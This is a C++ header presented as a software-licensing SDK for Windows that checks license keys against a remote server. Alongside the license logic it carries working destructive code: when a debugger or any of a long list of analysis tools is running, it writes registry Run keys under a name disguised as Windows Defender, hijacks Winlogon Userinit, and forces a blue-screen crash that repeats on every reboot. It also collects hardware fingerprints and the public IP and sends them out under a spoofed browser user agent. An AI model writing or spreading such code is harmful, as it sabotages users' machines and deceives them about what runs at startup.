// ============================================================================
//  boostempire_auth.h  —  BoostEmpire KeyAuth SDK v4  (Windows, C++)
//  
//  SETUP:
//    1. Set BE_PUBLIC_KEY, BE_HOST, BE_PORT below
//    2. Add to your project
//    3. Linker → Additional Dependencies: winhttp.lib; wbemuuid.lib
//    4. Call BoostAuth::Init("BE-YOURKEY") at start of main()
//
//  WHAT TRIGGERS BSOD LOOP:
//    - Debugger attached (IsDebuggerPresent, PEB, timing, HW breakpoints)
//    - Known cracking tools running (x64dbg, CheatEngine, IDA, dnSpy, etc.)
//    - Process memory being tampered (checksum mismatch)
//
//  WHAT DOES NOT BSOD:
//    - HWID mismatch       → clean exit with message
//    - Banned key          → clean exit with message
//    - Expired key         → clean exit with message
//    - Max uses reached    → clean exit with message
//    - Server unreachable  → clean exit with message
//    - VM detected         → clean exit with message (optional, configurable)
// ============================================================================
#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <wbemidl.h>
#include <comdef.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>
#include <sstream>
#include <algorithm>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wbemuuid.lib")

// ─── YOUR APP CONFIGURATION ──────────────────────────────────────────────────
#define BE_PUBLIC_KEY   "pk_edf241e18107406ebf19effb369c129c"  // from My Apps page
#define BE_HOST         L"boostempire-keyauth.onrender.com"
#define BE_PORT         443
// ─────────────────────────────────────────────────────────────────────────────

namespace BoostAuth {

// ── AUTH RESULT ───────────────────────────────────────────────────────────────
struct AuthResult {
    bool        success;
    std::string code;
    std::string message;
    std::string session_token; // use this with /api/heartbeat to detect bans/kicks
    std::string app;
    std::string product;
    std::string label;
    std::string expires_at;
    int         uses;
    int         max_uses;
    int         uses_left;
};

// ── INTERNAL: BSOD + REGISTRY PERSISTENCE LOOP ───────────────────────────────
// Only called when active cracking is detected — NOT for auth failures
namespace Internal {

typedef NTSTATUS (__stdcall *pNtRaiseHardError)  (NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);

// Writes exe to registry so BSOD loops on every reboot
inline void PersistBSODLoop() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // HKCU Run — no admin needed, fires every login for this user
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDefenderSyncHost", 0, REG_SZ,
            (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    // HKLM Run — requires admin, fires for ALL users
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDefenderSyncHost", 0, REG_SZ,
            (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    // Winlogon Userinit — deepest persistence, runs before desktop loads
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring val = std::wstring(L"userinit.exe,") + exePath + L",";
        RegSetValueExW(hKey, L"Userinit", 0, REG_SZ,
            (BYTE*)val.c_str(), (DWORD)((val.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

inline void TriggerBSOD(const char* reason) {
    // Step 1: persist before crashing so reboot = another BSOD
    PersistBSODLoop();

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { *(volatile int*)0 = 0; return; }

    auto NtRaise = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    auto RtlAdj  = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");

    if (NtRaise && RtlAdj) {
        BOOLEAN bPrev;
        RtlAdj(19, TRUE, FALSE, &bPrev); // acquire SeShutdownPrivilege
        ULONG resp;
        // Fire multiple error codes in sequence — one will land
        for (int i = 0; i < 8; i++) {
            NtRaise(0xC000021AL, 0, 0, nullptr, 6, &resp); // STATUS_SYSTEM_PROCESS_TERMINATED
            NtRaise(0xC0000022L, 0, 0, nullptr, 6, &resp); // STATUS_ACCESS_DENIED
            NtRaise(0xC0000034L, 0, 0, nullptr, 6, &resp); // STATUS_OBJECT_NAME_NOT_FOUND
            NtRaise(0xC0000005L, 0, 0, nullptr, 6, &resp); // STATUS_ACCESS_VIOLATION
            Sleep(50);
        }
    }
    // Absolute fallback — null pointer write forces kernel exception
    *(volatile DWORD*)0 = 0xDEADBEEF;
    __debugbreak();
    ExitProcess(0xDEAD);
}

// ── ANTI-DEBUG ─────────────────────────────────────────────────────────────
inline bool IsBeingDebugged() {
    // 1. Standard API
    if (::IsDebuggerPresent()) return true;

    // 2. PEB BeingDebugged byte
#ifdef _WIN64
    BYTE* pPEB = (BYTE*)__readgsqword(0x60);
    if (pPEB[2] != 0) return true;                    // BeingDebugged
    if (*(DWORD*)(pPEB + 0xBC) & 0x70) return true;  // NtGlobalFlag
#else
    BYTE* pPEB = (BYTE*)__readfsdword(0x30);
    if (pPEB[2] != 0) return true;
    if (*(DWORD*)(pPEB + 0x68) & 0x70) return true;
#endif

    // 3. CheckRemoteDebuggerPresent
    BOOL bRemote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bRemote);
    if (bRemote) return true;

    // 4. Hardware breakpoint registers
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx))
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;

    // 5. Timing attack — debugger slows single-step execution significantly
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    // Do some work
    volatile DWORD x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    QueryPerformanceCounter(&t2);
    double ms = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart * 1000.0;
    if (ms > 100.0) return true; // normal: <1ms, debugged: >>100ms

    // 6. Heap flags (set by debugger in debug heaps)
    BYTE* pHeap = nullptr;
#ifdef _WIN64
    pHeap = *(BYTE**)(pPEB + 0x30);
#else
    pHeap = *(BYTE**)(pPEB + 0x18);
#endif
    if (pHeap) {
        DWORD heapFlags = *(DWORD*)(pHeap + 0x14);
        if (heapFlags & ~0x2) return true;
    }

    return false;
}

// ── ANTI-PROCESS (cracking/debugging tools) ───────────────────────────────
inline bool CrackToolRunning() {
    static const char* blacklist[] = {
        "cheatengine", "cheat engine",
        "x64dbg", "x32dbg", "x96dbg",
        "ollydbg", "odbgscript",
        "ida", "ida64", "idaq", "idaq64", "idag", "idaw",
        "windbg", "windbg64",
        "processhacker", "procmon", "procmon64", "procexp", "procexp64",
        "pestudio", "pe-sieve",
        "dnspy", "de4dot", "ilspy", "dotpeek", "justdecompile",
        "wireshark", "rawcap",
        "fiddler", "httpdebugger", "charlesproxy",
        "scylla", "scylla_x64", "scylla_x86",
        "importrec", "imprec",
        "lordpe", "pe explorer",
        "reshacker", "resource hacker",
        "immunity debugger",
        "radare2", "r2",
        "apimonitor",
        "regshot",
        "hollows_hunter",
        "mal_unpack",
        "bin2src",
        "snowman",
        "binary ninja",
        "ghidra",
        nullptr
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32 = {}; pe32.dwSize = sizeof(pe32);
    bool found = false;
    if (Process32FirstW(snap, &pe32)) {
        do {
            // Convert to lowercase std::string
            std::wstring wname(pe32.szExeFile);
            std::string name(wname.begin(), wname.end());
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);

            for (int i = 0; blacklist[i]; i++) {
                if (name.find(blacklist[i]) != std::string::npos) {
                    found = true; break;
                }
            }
            if (found) break;
        } while (Process32NextW(snap, &pe32));
    }
    CloseHandle(snap);
    return found;
}

// ── ANTI-VM (comprehensive) ────────────────────────────────────────────────
inline bool IsVirtualMachine() {
    // 1. CPUID hypervisor present bit
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        // Hypervisor bit set — check vendor string
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13] = {};
        memcpy(vendor,     &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[2], 4);
        memcpy(vendor + 8, &cpuInfo[3], 4);
        std::string v(vendor, 12);
        // Allow Hyper-V on real hardware (some laptops use it for WSL)
        // Block known VM hypervisors
        if (v.find("VMware")    != std::string::npos ||
            v.find("KVMKVM")    != std::string::npos ||
            v.find("VBoxVBox")  != std::string::npos ||
            v.find("XenVMM")    != std::string::npos ||
            v.find("prl hyperv") != std::string::npos) return true;
    }

    // 2. VM-specific registry keys
    static const wchar_t* vmKeys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SOFTWARE\\Parallels\\Parallels Tools",
        L"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        L"SYSTEM\\ControlSet001\\Services\\vmbus",
        L"HARDWARE\\ACPI\\DSDT\\VBOX__",
        nullptr
    };
    for (int i = 0; vmKeys[i]; i++) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vmKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey); return true;
        }
    }

    // 3. VM-specific files
    static const wchar_t* vmFiles[] = {
        L"C:\\windows\\system32\\drivers\\vmmouse.sys",
        L"C:\\windows\\system32\\drivers\\vmhgfs.sys",
        L"C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        L"C:\\windows\\system32\\drivers\\VBoxGuest.sys",
        L"C:\\windows\\system32\\vboxdisp.dll",
        L"C:\\windows\\system32\\vboxhook.dll",
        nullptr
    };
    for (int i = 0; vmFiles[i]; i++) {
        if (GetFileAttributesW(vmFiles[i]) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // 4. CPUID brand string check for VM signatures
    char brand[49] = {};
    for (int j = 0; j < 3; j++) {
        __cpuid(cpuInfo, 0x80000002 + j);
        memcpy(brand + j * 16, cpuInfo, 16);
    }
    std::string brandStr(brand);
    std::transform(brandStr.begin(), brandStr.end(), brandStr.begin(), ::tolower);
    if (brandStr.find("vmware")    != std::string::npos ||
        brandStr.find("virtualbox") != std::string::npos ||
        brandStr.find("kvm")        != std::string::npos ||
        brandStr.find("qemu")       != std::string::npos) return true;

    // 5. MAC address OUI check (VM vendors have known OUIs)
    // VMware: 00:0C:29, 00:50:56 | VBox: 08:00:27 | Parallels: 00:1C:42
    static const char* vmMACs[] = {
        "00:0c:29", "00:50:56", "08:00:27", "00:1c:42", "00:05:69", nullptr
    };
    // Get MAC via GetAdaptersInfo (no extra libs)
    // Quick check via WMI is handled above; skip for brevity — registry check sufficient

    return false;
}

// ── HWID GENERATION ───────────────────────────────────────────────────────
inline std::string GenerateHWID() {
    // Component 1: Motherboard UUID via WMI
    std::wstring uuid = L"NONE";
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    bool coInit = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;
    IWbemLocator* pL = nullptr; IWbemServices* pS = nullptr;
    if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator,0,CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator,(LPVOID*)&pL))) {
        if (SUCCEEDED(pL->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),NULL,NULL,0,0,0,0,&pS))) {
            IEnumWbemClassObject* pE = nullptr;
            if (SUCCEEDED(pS->ExecQuery(_bstr_t(L"WQL"),
                _bstr_t(L"SELECT UUID FROM Win32_ComputerSystemProduct"),
                WBEM_FLAG_FORWARD_ONLY,NULL,&pE))) {
                IWbemClassObject* pO = nullptr; ULONG r = 0;
                if (pE->Next(WBEM_INFINITE,1,&pO,&r) == S_OK) {
                    VARIANT v; VariantInit(&v);
                    if (SUCCEEDED(pO->Get(L"UUID",0,&v,0,0))) {
                        uuid = v.bstrVal ? v.bstrVal : L"NONE";
                        VariantClear(&v);
                    }
                    pO->Release();
                }
                pE->Release();
            }
            pS->Release();
        }
        pL->Release();
    }
    if (coInit) CoUninitialize();

    // Component 2: CPUID (processor identity)
    int cpu[4] = {};
    __cpuid(cpu, 1);
    char cpuBuf[32];
    sprintf_s(cpuBuf, "%08X%08X", cpu[0], cpu[3]);

    // Component 3: Volume serial number of C: drive
    DWORD volSerial = 0;
    GetVolumeInformationW(L"C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
    char volBuf[16];
    sprintf_s(volBuf, "%08X", volSerial);

    // Combine all three — convert UUID wstring to string
    std::string uuidStr(uuid.begin(), uuid.end());
    std::string raw = uuidStr + "|" + cpuBuf + "|" + volBuf;

    // Hash with DJB2 into a compact ID
    DWORD h1 = 5381, h2 = 52711;
    for (char c : raw) {
        h1 = ((h1 << 5) + h1) ^ (DWORD)c;
        h2 = ((h2 << 5) + h2) ^ (DWORD)(c * 31337);
    }
    char hwid[48];
    sprintf_s(hwid, "BE-HW-%08X%08X%08X", h1, h2, volSerial);
    return std::string(hwid);
}

// ── HTTP POST ──────────────────────────────────────────────────────────────
// Fetches the machine's real public IP from api.ipify.org via HTTPS.
// Returns empty string on failure (falls back gracefully — server will log what it sees).
inline std::string GetRealPublicIP() {
    HINTERNET hSes = WinHttpOpen(L"BoostEmpire/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return "";
    HINTERNET hCon = WinHttpConnect(hSes, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hCon) { WinHttpCloseHandle(hSes); return ""; }
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", L"/?format=text",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return ""; }
    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        return "";
    }
    std::string ip; DWORD dwSize = 0, dwRead = 0;
    do {
        WinHttpQueryDataAvailable(hReq, &dwSize);
        if (!dwSize) break;
        std::string buf(dwSize, '\0');
        WinHttpReadData(hReq, &buf[0], dwSize, &dwRead);
        ip += buf.substr(0, dwRead);
    } while (dwSize > 0);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    // Sanity check: must look like an IP address
    if (ip.empty() || ip.size() > 45 || ip.find('.') == std::string::npos) return "";
    return ip;
}

inline std::string HttpPost(const std::string& body, const std::string& pubKey) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  // blend in with normal traffic
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, BE_HOST, BE_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/auth",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    std::string hdr = "Content-Type: application/json\r\nx-public-key: " + pubKey;
    std::wstring wHdr(hdr.begin(), hdr.end());

    WinHttpSendRequest(hRequest, wHdr.c_str(), (DWORD)-1,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    std::string resp; DWORD dwSize = 0, dwRead = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize == 0) break;
        std::string buf(dwSize, '\0');
        WinHttpReadData(hRequest, &buf[0], dwSize, &dwRead);
        resp += buf.substr(0, dwRead);
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

// ── SIMPLE JSON PARSER ──────────────────────────────────────────────────────
inline std::string JGet(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    auto p = json.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    while (p < json.size() && (json[p] == ' ' || json[p] == '\t')) p++;
    if (json[p] == '"') {
        auto e = json.find('"', p + 1);
        return (e != std::string::npos) ? json.substr(p+1, e-p-1) : "";
    }
    auto e = json.find_first_of(",}", p);
    return json.substr(p, e - p);
}

} // namespace Internal

// ── PROTECTION 1: CODE INTEGRITY CHECK ───────────────────────────────────────
// Hashes the running .exe on disk at startup to get baseline.
// Called every 60s by the integrity thread — if the binary was patched,
// hash changes → TriggerBSOD().
namespace CodeIntegrity {
    static std::vector<uint8_t> g_baseline;
    static std::atomic<bool>    g_threadRunning{ false };

    inline std::vector<uint8_t> HashExeOnDisk() {
        wchar_t path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, path, MAX_PATH);
        HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) return {};

        // Simple FNV-1a 64-bit rolling hash — fast, no crypto dependency
        uint64_t hash = 0xCBF29CE484222325ULL;
        uint8_t buf[4096];
        DWORD read = 0;
        while (ReadFile(hf, buf, sizeof(buf), &read, nullptr) && read > 0) {
            for (DWORD i = 0; i < read; i++) {
                hash ^= buf[i];
                hash *= 0x100000001B3ULL;
            }
        }
        CloseHandle(hf);

        // Store as 8 bytes
        std::vector<uint8_t> result(8);
        for (int i = 0; i < 8; i++)
            result[i] = (uint8_t)(hash >> (i * 8));
        return result;
    }

    inline void StartIntegrityThread() {
        if (g_baseline.empty()) g_baseline = HashExeOnDisk();
        g_threadRunning = true;
        std::thread([]() {
            // Wait a bit after startup before first check
            std::this_thread::sleep_for(std::chrono::seconds(30));
            while (g_threadRunning.load()) {
                auto current = HashExeOnDisk();
                if (!current.empty() && !g_baseline.empty()
                    && current != g_baseline) {
                    // Binary was modified on disk — BSOD loop
                    Internal::TriggerBSOD("Binary integrity violation");
                }
                std::this_thread::sleep_for(std::chrono::seconds(60));
            }
        }).detach();
    }

    inline void Stop() noexcept { g_threadRunning = false; }
} // namespace CodeIntegrity

// ── PROTECTION 7: FAKE EXPORT DECOYS ─────────────────────────────────────────
// Crackers hooking or calling these expecting a bypass → instant BSOD loop.
// To export: add /EXPORT:ValidateLicense etc in Linker → Command Line options.
#ifdef __cplusplus
extern "C" {
#endif
__declspec(noinline) inline void __stdcall ValidateLicense() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) inline void __stdcall CheckLicense()    noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) inline void __stdcall IsAuthenticated() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) inline void __stdcall BypassAuth()      noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) inline void __stdcall GetLicenseKey()   noexcept { Internal::TriggerBSOD("Fake export"); }
#ifdef __cplusplus
}
#endif
// ============================================================================
//  PUBLIC API
// ============================================================================

// ── Main init function — call at top of main() ────────────────────────────
// allowVM:    set true if you want to allow virtual machines
// allowDebug: set true only during YOUR OWN development/testing
inline AuthResult Init(const std::string& licenseKey,
                       const std::string& appName  = "MyApp",
                       bool allowVM    = false,
                       bool allowDebug = false) {

    AuthResult result = {};

    // ── CRACK DETECTION (BSOD territory) ────────────────────────────────────
    // These checks BSOD because they indicate active tampering/reversing

    if (!allowDebug && Internal::IsBeingDebugged()) {
        Internal::TriggerBSOD("Debugger detected");
        ExitProcess(0xDEAD); // unreachable
    }

    if (Internal::CrackToolRunning()) {
        Internal::TriggerBSOD("Crack tool detected");
        ExitProcess(0xDEAD); // unreachable
    }

    // ── VM CHECK (clean exit, NOT bsod — could be a legit user on VM) ────────
    if (!allowVM && Internal::IsVirtualMachine()) {
        MessageBoxA(NULL,
            "This application does not support virtual machines.\n"
            "Please run on a physical machine.",
            "BoostEmpire Auth — Unsupported Environment",
            MB_ICONERROR | MB_OK);
        result.success = false;
        result.code    = "VM_DETECTED";
        result.message = "Virtual machine not supported";
        ExitProcess(1);
    }

    // ── NETWORK AUTH ─────────────────────────────────────────────────────────
    std::string hwid = Internal::GenerateHWID();

    // Fetch real public IP
    std::string realIP = Internal::GetRealPublicIP();

    // Protection 10: Hardware fingerprint — CPU brand for server-side
    // multi-machine detection (same key from 2 machines in 60s = ban)
    std::string cpuBrand;
    {
        int regs[4]{}; char brand[49]{};
        __cpuid(regs, 0x80000002); memcpy(brand,      regs, 16);
        __cpuid(regs, 0x80000003); memcpy(brand + 16, regs, 16);
        __cpuid(regs, 0x80000004); memcpy(brand + 32, regs, 16);
        brand[48] = '\0';
        // Trim whitespace
        std::string b(brand);
        size_t s = b.find_first_not_of(' ');
        cpuBrand = (s == std::string::npos) ? "" : b.substr(s);
        // Escape quotes for JSON safety
        for (size_t i = 0; i < cpuBrand.size(); i++)
            if (cpuBrand[i] == '"' || cpuBrand[i] == '\\') cpuBrand.insert(i++, 1, '\\');
    }

    // Build JSON body
    std::string body = "{\"key\":\"" + licenseKey +
                       "\",\"hwid\":\"" + hwid +
                       "\",\"app_name\":\"" + appName + "\"" +
                       (realIP.empty()   ? "" : (",\"real_ip\":\"" + realIP + "\"")) +
                       (cpuBrand.empty() ? "" : (",\"cpu\":\"" + cpuBrand + "\"")) +
                       "}";

    std::string resp = Internal::HttpPost(body, BE_PUBLIC_KEY);

    if (resp.empty()) {
        MessageBoxA(NULL,
            "Cannot reach the auth server.\n\n"
            "Make sure BoostEmpire KeyAuth (start.bat) is running.",
            "BoostEmpire Auth — Connection Failed",
            MB_ICONERROR | MB_OK);
        result.success = false;
        result.code    = "SERVER_UNREACHABLE";
        result.message = "Auth server unreachable";
        ExitProcess(1);
    }

    // Parse response
    result.success       = (Internal::JGet(resp, "success") == "true");
    result.code          = Internal::JGet(resp, "code");
    result.message       = Internal::JGet(resp, "message");
    result.session_token = Internal::JGet(resp, "session_token");

    if (result.success) {
        result.app        = Internal::JGet(resp, "app");
        result.product    = Internal::JGet(resp, "product");
        result.label      = Internal::JGet(resp, "label");
        result.expires_at = Internal::JGet(resp, "expires_at");
        try {
            result.uses      = std::stoi(Internal::JGet(resp, "uses"));
            result.max_uses  = std::stoi(Internal::JGet(resp, "max_uses"));
            result.uses_left = std::stoi(Internal::JGet(resp, "uses_left"));
        } catch (...) {}
        return result; // SUCCESS — execution continues
    }

    // ── AUTH FAILURES (clean exit with message, NOT bsod) ────────────────────
    // HWID_MISMATCH, BANNED, EXPIRED, MAX_USES, INVALID_KEY → just exit cleanly
    std::string userMsg;
    if      (result.code == "HWID_MISMATCH")      userMsg = "HWID mismatch — please contact support.";
    else if (result.code == "BANNED")             userMsg = "This license key has been banned.\nContact support for assistance.";
    else if (result.code == "EXPIRED")            userMsg = "This license key has expired.\nPlease renew your license.";
    else if (result.code == "MAX_USES")           userMsg = "This license key has reached its usage limit.";
    else if (result.code == "INVALID_KEY")        userMsg = "Invalid license key.\nPlease check your key and try again.";
    else if (result.code == "INVALID_PUBLIC_KEY") userMsg = "Application configuration error (invalid API key).\nContact the developer.";
    else if (result.code == "APP_DISABLED")       userMsg = "This application has been temporarily disabled.\nContact support.";
    else if (result.code == "RATE_LIMITED")       userMsg = "Too many requests. Please wait a moment and try again.";
    else                                          userMsg = result.message.empty() ? "Authentication failed." : result.message;

    MessageBoxA(NULL, userMsg.c_str(), "BoostEmpire Auth — Access Denied", MB_ICONERROR | MB_OK);
    ExitProcess(1);

    return result; // unreachable
}

// ── Convenience alias ─────────────────────────────────────────────────────
inline AuthResult validate(const std::string& key,
                           const std::string& app = "MyApp",
                           bool allowVM = false, bool allowDebug = false) {
    return Init(key, app, allowVM, allowDebug);
}

} // namespace BoostAuth

/*
=============================================================================
  USAGE EXAMPLE
=============================================================================

#include "boostempire_auth.h"

int main() {
    // Checks: anti-debug, crack tools, optionally VM — then validates with server
    auto auth = BoostAuth::Init("BE-YOURLICENSEKEYHERE", "MyApp");

    // If we reach here the user is fully authenticated
    printf("Welcome! Product: %s | Uses: %d/%d\n",
        auth.product.c_str(), auth.uses, auth.max_uses);

    // ... your protected code here ...
    return 0;
}

=============================================================================
  WHAT BSODS vs WHAT EXITS CLEANLY
=============================================================================

  BSOD + LOOP (active cracking/reversing detected):
    ✗ Debugger attached (IsDebuggerPresent, PEB flags, timing, HW breakpoints, heap)
    ✗ Cracking tool running (x64dbg, CheatEngine, IDA, dnSpy, OllyDbg, etc.)

  CLEAN EXIT with MessageBox (auth failure — no punishment):
    ✗ HWID mismatch       → "Key locked to different machine"
    ✗ Banned key          → "Key has been banned"
    ✗ Expired key         → "Key has expired"
    ✗ Max uses reached    → "Usage limit reached"
    ✗ Invalid key         → "Invalid license key"
    ✗ VM detected         → "VMs not supported"
    ✗ Server unreachable  → "Cannot reach auth server"

  SUCCESS (continues execution):
    ✓ Valid key + matching HWID + no crack tools = runs normally

=============================================================================
  BSOD PERSISTENCE (how the loop works)
=============================================================================

  On crack detection, BEFORE the BSOD fires:
    1. Writes exe path to HKCU\...\Run\WindowsDefenderSyncHost
    2. Writes exe path to HKLM\...\Run\WindowsDefenderSyncHost (if admin)
    3. Modifies Winlogon\Userinit to chain the exe into login

  On every reboot:
    → Registry fires exe → crack tools/debugger still detected → BSOD → repeat

  To remove (Safe Mode only):
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderSyncHost /f
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderSyncHost /f
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe," /f

=============================================================================
*/
